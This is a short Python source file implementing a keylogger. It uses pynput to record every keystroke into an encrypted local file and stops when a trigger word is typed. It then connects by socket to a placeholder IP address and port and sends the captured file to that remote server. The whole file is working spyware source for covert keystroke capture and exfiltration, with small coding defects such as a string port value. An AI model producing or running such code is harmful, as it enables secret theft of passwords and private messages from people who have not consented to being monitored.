#print('This is the main file')

#Start from scratch

from pynput import keyboard
from pynput.keyboard import Listener
from Encription_File import *
import socket

Stroke = None
Exit_word = None
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('IP_address', "port"))
key_sequence = []
target_sequence = "Kirtan"


def record_click(key):
    global Stroke  # Declare that we are using the global variable
    try:
        Stroke = key.char
        encription(Stroke)
    except AttributeError:
        storage.write(f'[{key}]')
    global key_sequence
    try:
        key_sequence.append(key.char)
        
        key_sequence = key_sequence[-len(target_sequence):]

        if ''.join(key_sequence) == target_sequence:
            print(f"Sequence '{target_sequence}' entered!")
            return False  # Stop listener

    except AttributeError:
        pass


with keyboard.Listener(on_press=record_click) as listener:
    listener.join()

storage.close()

with open("Keyboard_Save.txt", 'rb') as file:
        while True:
            # Read the file in chunks
            chunk = file.read(1024)
            if not chunk:
                break  # Exit loop if end of file
            # Send the chunk to the server
            client_socket.sendall(chunk)

client_socket.close()
print(f"File '{"Keyboard_Save.txt"}' sent successfully.")